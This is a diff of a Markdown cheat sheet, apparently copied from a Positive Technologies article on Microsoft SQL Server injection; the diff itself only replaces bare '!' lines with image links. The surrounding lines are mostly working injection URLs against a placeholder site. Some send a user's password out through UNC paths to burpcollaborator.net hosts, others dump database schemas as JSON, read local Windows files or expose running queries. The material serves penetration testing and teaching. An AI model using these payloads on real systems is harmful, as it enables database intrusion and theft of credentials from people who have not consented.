@@ -73,7 +73,7 @@ If confronted with a fully blind SQL injection with **disabled** stacked queries
 https://vuln.app/getItem?id= 1+and+exists(select+*+from+fn_xe_file_target_read_file('C:\*.xel','\\'%2b(select+pass+from+users+where+id=1)%2b'.064edw6l0h153w39ricodvyzuq0ood.burpcollaborator.net\1.xem',null,null))
 ```
 
-!
+![](https://swarm.ptsecurity.com/wp-content/uploads/2020/11/3.png)
 
 **Permissions:** Requires VIEW SERVER STATE permission on the server.
 
@@ -83,7 +83,7 @@ https://vuln.app/getItem?id= 1+and+exists(select+*+from+fn_xe_file_target_read_f
 https://vuln.app/getItem?id= 1%2b(select+1+where+exists(select+*+from+fn_get_audit_file('\\'%2b(select+pass+from+users+where+id=1)%2b'.x53bct5ize022t26qfblcsxwtnzhn6.burpcollaborator.net\',default,default)))
 ```
 
-!
+![](https://swarm.ptsecurity.com/wp-content/uploads/2020/11/2.png)
 
 **Permissions:** Requires the CONTROL SERVER permission.
 
@@ -93,7 +93,7 @@ https://vuln.app/getItem?id= 1%2b(select+1+where+exists(select+*+from+fn_get_aud
 https://vuln.app/ getItem?id=1+and+exists(select+*+from+fn_trace_gettable('\\'%2b(select+pass+from+users+where+id=1)%2b'.ng71njg8a4bsdjdw15mbni8m4da6yv.burpcollaborator.net\1.trc',default))
 ```
 
-!
+![](https://swarm.ptsecurity.com/wp-content/uploads/2020/11/1.png)
 
 **Permissions:** Requires the CONTROL SERVER permission.
 
@@ -117,7 +117,7 @@ Example use of function `USER_NAME()`:
 https://vuln.app/getItem?id=1'%2buser_name(@@version)--
 ```
 
-!
+![](https://swarm.ptsecurity.com/wp-content/uploads/2020/11/6.png)
 
 ## **Quick exploitation: Retrieve an entire table in one query**
 
@@ -129,7 +129,7 @@ The query to retrieve the schema, tables and columns from the current database:
 https://vuln.app/getItem?id=-1'+union+select+null,concat_ws(0x3a,table_schema,table_name,column_name),null+from+information_schema.columns+for+json+auto--
 ```
 
-!
+![](https://swarm.ptsecurity.com/wp-content/uploads/2020/11/5.png)
 
 Error-based vectors need an alias or a name, since the output of expressions without either cannot be formatted as JSON.
 
@@ -137,7 +137,7 @@ Error-based vectors need an alias or a name, since the output of expressions wit
 https://vuln.app/getItem?id=1'+and+1=(select+concat_ws(0x3a,table_schema,table_name,column_name)a+from+information_schema.columns+for+json+auto)--
 ```
 
-!
+![](https://swarm.ptsecurity.com/wp-content/uploads/2020/11/7.png)
 
 ## **Reading local files**
 
@@ -147,7 +147,7 @@ An example of retrieving a local file `C:\Windows\win.ini` using the function Op
 https://vuln.app/getItem?id=-1+union+select+null,(select+x+from+OpenRowset(BULK+’C:\Windows\win.ini’,SINGLE_CLOB)+R(x)),null,null
 ```
 
-!
+![](https://swarm.ptsecurity.com/wp-content/uploads/2020/11/8.png)
 
 Error-based vector:
 
@@ -165,7 +165,7 @@ The current SQL query being executed can be retrieved from access `sys.dm_exec_r
 https://vuln.app/getItem?id=-1%20union%20select%20null,(select+text+from+sys.dm_exec_requests+cross+apply+sys.dm_exec_sql_text(sql_handle)),null,null
 ```
 
-!
+![](https://swarm.ptsecurity.com/wp-content/uploads/2020/11/9.png)
 
 **Permissions:** If the user has VIEW SERVER STATE permission on the server, the user will see all executing sessions on the instance of SQL Server; otherwise, the user will see only the current session.
 
